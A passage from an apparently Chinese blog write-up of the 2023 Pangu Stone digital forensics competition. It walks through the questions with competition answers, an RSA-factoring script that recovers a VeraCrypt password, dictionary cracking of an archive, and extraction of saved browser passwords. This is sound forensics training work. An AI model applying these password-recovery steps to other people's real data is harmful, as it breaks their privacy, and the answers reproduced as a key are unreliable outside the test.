id="question1">question1√</h2><p>分析卡农手机，给出手机的SDK版本？[答案格式:28]</p><p>这题火眼就梭不出来了，这里要直接使用搓，并且也不能直接把文件一键解压（耗时太久），直接访问压缩包</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106154910323.png" alt="image-20251106154910323"></p><p>打开<code>deviceinfo.json</code>文件，搜索sdk即可</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106154812025.png" alt="image-20251106154812025"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30</span><br></pre></td></tr></table></figure><h2 id="question2">question2</h2><p>分析卡农手机，给出手机最近开机的时间？[答案格式:2023-05-18-19:09:59]</p><h2 id="question3">question3</h2><p>分析卡农手机，给出高德地图关联的手机号是？[答案格式:13011221234]</p><h2 id="question4">question4</h2><p>分析卡农手机，给出卡农内部聊天工具的昵称是？[答案格式:李多余]</p><h2 id="question5">question5</h2><p>分析卡农手机，给出卡农的真实名字可能是？[答案格式:李多余]</p><h1 id="计算机取证">计算机取证</h1><h2 id="question1">question1√</h2><p>黑客计算机系统安装时间是？[答案格式:2000/01/01 01:00:01]</p><p>这题就直接火眼一把梭即可</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106111447630.png" alt="image-20251106111447630"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/05/10 13:31:47</span><br></pre></td></tr></table></figure><h2 id="question2">question2√</h2><p>黑客计算机磁盘0的总磁道数？[答案格式:数字中无标点]</p><p>这题一开始做也不知道去哪里找，看了wp才知道直接看系统信息就行了，感觉还是太依赖宏联一把梭工具了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106112238072.png" alt="image-20251106112238072"></p><h2 id="question3">question3√</h2><p>黑客计算机的产品密钥是？[答案格式:字母大写]</p><p>无语了，计算机的产品密钥把它误认为BitLocker恢复密钥了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106112736576.png" alt="image-20251106112736576"></p><h2 id="question4">question4?</h2><p>黑客计算机共有几次卷影拷贝服务关闭事件？[答案格式:1]</p><p>这题存疑，思路就是看日志，直接仿真机用事件查看器看即可。</p><h3 id="解题过程">解题过程</h3><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106115223306.png" alt="image-20251106115223306"></p><p>卷影拷贝服务其实就是<code>VSS</code>，只要找到<code>VSS</code>就行了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106115423093.png" alt="image-20251106115423093"></p><ul><li>但是这里只有一个<code>VSS</code>脱机关闭日志，而答案是两个，这题存疑</li></ul><h3 id="vss服务">VSS服务</h3><p>看这篇文章做了解：<a href="https://www.cnblogs.com/suv789/p/17777417.html">卷影副本（Volume Shadow Copy）是Windows操作系统提供的一项备份和恢复功能。它允许在文件被修改或删除之前，创建文件或文件夹的副本，以便在需要时进行数据的还原和恢复。卷影副本主要有以下作用和优势 - suv789 - 博客园</a></p><h2 id="question5">question5√</h2><p>黑客计算机的vc容器解密密码是？[答案格式:字母小写]</p><p>在仿真机上可以看到<code>VC</code>容器密码这个文件夹，但是发现<code>vc</code>容器密码被RSA加密过了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106115719838.png" alt="image-20251106115719838"></p><p>这个对于密码手还比较容易的，但是还有个问题该文件只有公钥没有私钥，先不用管先把公钥提取出来再说，先导出公钥和密文</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106120003224.png" alt="image-20251106120003224"></p><p>使用Python提取公钥，发现n比较大，虽然有个小模数，但是yafu分解不出来（可能是我的yafu版本太低了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line">pub_path = <span class="string">r&quot;F:\2023盘古石\pub.key&quot;</span></span><br><span class="line">c_path = <span class="string">r&quot;F:\2023盘古石\m&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">pem = <span class="built_in">open</span>(pub_path,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">pub_key = serialization.load_pem_public_key(pem.read())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,pub_key.public_numbers())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;RSAPublicNumbers(e=65537, n=18762288330807505336471569952368628968038915032364773203018829070696227411217877868952724842039756288121734420378039301563905037169196320417706839549744629044465352679919380329435329653365900312498712121432190200717072138327379844913608851715404086200984072727408758802012147296753317519612628629535373054730645471938738605688629618951071483635716677866010394704066696480858977560809007683074249820225609075518509112704549293147063971302640066331096645041521401155565628466857211261242132897152403975836705170916276159246187173035660820037820087171748591660487636434105623595720788169970861783452500198572918584010881)&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>使用sage尝试分解一下，发现<code>sage</code>可以比较快的分解出来</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106122227851.png" alt="image-20251106122227851"></p><p>那就直接正常的解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c_path = <span class="string">r&quot;F:\2023盘古石\m&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">18762288330807505336471569952368628968038915032364773203018829070696227411217877868952724842039756288121734420378039301563905037169196320417706839549744629044465352679919380329435329653365900312498712121432190200717072138327379844913608851715404086200984072727408758802012147296753317519612628629535373054730645471938738605688629618951071483635716677866010394704066696480858977560809007683074249820225609075518509112704549293147063971302640066331096645041521401155565628466857211261242132897152403975836705170916276159246187173035660820037820087171748591660487636434105623595720788169970861783452500198572918584010881</span></span><br><span class="line">p = <span class="number">250527704258269</span></span><br><span class="line">q = <span class="number">74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349</span></span><br><span class="line">c_ = <span class="built_in">open</span>(c_path,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = c_.read()</span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106122523231.png" alt="image-20251106122523231"></p><ul><li>答案：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byebyedisco</span><br></pre></td></tr></table></figure><h2 id="question6">question6√</h2><p>黑客计算机加密容器中共有几个docx文件？[答案格式:x]</p><p>有了容器密码就可以直接挂载了，现在我们要找到相应的容器，这里其实加密的是它电脑上的一个盘，这里发现有一个<code>E</code>盘，但是打不开。这个就是被加密的盘</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123025313.png" alt="image-20251106123025313"></p><p>打开仿真机中的<code>VC</code>加密应用</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123250885.png" alt="image-20251106123250885"></p><p>这样即可解密出被加密的磁盘</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123315422.png" alt="image-20251106123315422"></p><p>查看被加密的磁盘里面的内容会发现有4个文档，其中有三个<code>.docx</code>文档</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123343541.png" alt="image-20251106123343541"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="question7">question7√</h2><p>黑客计算机加密容器中记录的bt币地址有几个？[答案格式:x]</p><p>根据题目内容，直接查看容器中<code>bt币地址与受害人</code>这个表格即可，但是和我想的不一样。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123627150.png" alt="image-20251106123627150"></p><p>这个时候需要用到美亚取证大师的<code>vc</code>解密，火眼的<code>vc</code>解密有点问题</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132224028.png" alt="image-20251106132224028"></p><ul><li>这里还要介绍一下<code>PIM</code>值</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132252808.png" alt="image-20251106132252808"></p><ul><li>填入<code>PIM</code>值和密码之后就会出现这样，输入默认<code>PIM</code>值<code>0</code>以及前面的密码<code>byebyedisco</code>即可解密</li><li>解密后翻找目录会发现这个<code>tmp</code>文件，导出这个文件，然后使用<code>zip</code>后缀，解压缩后就会看到</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132644879.png" alt="image-20251106132644879"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132716370.png" alt="image-20251106132716370"></p><ul><li>点开来看，发现有4个地址</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132732797.png" alt="image-20251106132732797"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="question8">question8√</h2><p>黑客计算机加密容器中记录的受害人共有多少人？[答案格式:xx]</p><ul><li>直接就看加密容器中的<code>xlsx</code>文件，发现有<code>29</code>个</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132832135.png" alt="image-20251106132832135"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span></span><br></pre></td></tr></table></figure><h2 id="question9">question9√</h2><p>黑客计算机中win7虚拟机中www用户的登陆密码是？[答案格式:xxxxxxx]</p><p>这个时候就要看<code>disk1.E01</code>这个镜像了，发现有一个<code>win7.7z</code>的压缩包，原本想直接用火眼提取一下，结果发现提取不出来，直接就在资源管理器打开即可。打开后复制一份到别的地方。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106133334079.png" alt="image-20251106133334079"></p><p>然后进行解压操作，发现该压缩包还有密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106133740595.png" alt="image-20251106133740595"></p><p>这个就还需要爆破密码，而爆破密码的字典是前面黑客上传的<code>.txt</code>文件的内容，这里有个软件比较好用<code>Passware Kit Forensic</code>，使用该软件进行压缩包的密钥爆破，获取地址：<a href="https://mp.weixin.qq.com/s/1IGb2tMPjxAwIMwpebfL7A">密码恢复神器-Passware Kit Forensic</a></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106135434986.png" alt="image-20251106135434986"></p><p>将文件拖入进去</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106135608234.png" alt="image-20251106135608234"></p><p>选择自定义设置</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140016379.png" alt="image-20251106140016379"></p><p>选择字典攻击，并双击进行设置</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140035534.png" alt="image-20251106140035534"></p><p>使用流量包的那个<code>.txt</code>文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140114185.png" alt="image-20251106140114185"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140142797.png" alt="image-20251106140142797"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140154940.png" alt="image-20251106140154940"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140210668.png" alt="image-20251106140210668"></p><p>没开gpu爆还是太慢了，直接开gpu爆</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140957724.png" alt="image-20251106140957724"></p><p>最后找到密码为<code>zymogenesis</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106141308429.png" alt="image-20251106141308429"></p><p>然后就可以开始解压了，解压之后发现是虚拟机文件，先放入火眼去取</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106141616579.png" alt="image-20251106141616579"></p><p>将镜像文件丢给火眼就能看到密码了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106142247693.png" alt="image-20251106142247693"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12345678</span></span><br></pre></td></tr></table></figure><h2 id="question10">question10√</h2><p>黑客计算机中win7虚拟机中chrome浏览“<a href="http://bjh.com">bjh.com</a>”网站保存的密码是？[答案格式:xx]</p><p>这题火眼也直接一把梭了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106142353258.png" alt="image-20251106142353258"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin123!@<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="question11">question11√</h2><p>分析技术人员电脑，请给出电脑系统安装时间（UTC-0）?[答案格式:20000-01-01 00:00:00]</p><p>这题也就火眼一把梭即可，转换为<code>UTC-0</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106143539007.png" alt="image-20251106143539007"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>-04-<span class="number">19</span> 06:<span class="number">10</span>:<span class="number">50</span></span><br></pre></td></tr></table></figure><h2 id="question12">question12√</h2><p>分析技术人员电脑，请给出电脑内用户John的SID？[答案格式:x-x-x-x-x-x-x-x]</p><p>继续火眼一把梭</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106143626828.png" alt="image-20251106143626828"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2950582214</span>-<span class="number">2327523445</span>-<span class="number">121360615</span>-<span class="number">1001</span></span><br></pre></td></tr></table></figure><h2 id="question13">question13√</h2><p>据技术人员交代，其电脑连接过nas服务器，请给出该nas服务器的iqn名称？[答案格式:iqn.xxx]</p><p>其实这题在<code>NAS</code>服务器那边会更好得到答案，这里我采用暴力搜索的方式直接在技术人员的镜像文件里面搜索</p><p>果然是在<code>NAS</code>服务器会更好找到，先找到<code>nas</code>的全局配置，再找到目标</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108001033040.png" alt="image-20251108001033040"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108001103131.png" alt="image-20251108001103131"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iqn<span class="number">.2005</span>-<span class="number">10.</span>org.freenas.ctl:windows</span><br></pre></td></tr></table></figure><h2 id="question14">question14√</h2><p>分析技术人员电脑，请给出该技术人员使用的隐写工具名称？[答案格式:xx]</p><p>这个实际上隐写工具应该是没在电脑上，只能看一些记录，发现这个<code>oursecret</code></p><p><img 